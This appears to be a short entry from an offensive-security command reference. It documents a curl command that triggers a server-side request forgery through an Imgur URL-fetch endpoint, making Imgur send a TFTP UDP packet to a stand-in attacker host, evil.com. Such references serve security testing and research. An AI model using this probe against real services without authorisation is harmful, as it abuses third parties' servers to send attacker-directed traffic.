---
data: 'curl "https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET"'
tags:
  - ssrf
  - tftp
type: command
output: HTTP response; sends UDP packet
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:08.979Z'
id: 454e2e5e-4da0-429c-9870-c727049c572d
verified: false
validated: true
submitted: true
---
# curl-tftp-trigger

## Command

```bash
curl "https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET"
```

## Description

Trigger TFTP SSRF to send UDP packets via Imgur.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url=` | TFTP URL with filename for packet crafting | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

UDP packet on listener.

## Related

- [[procedures/Demonstrate-UDP-SSRF-with-TFTP-and-Netcat]]
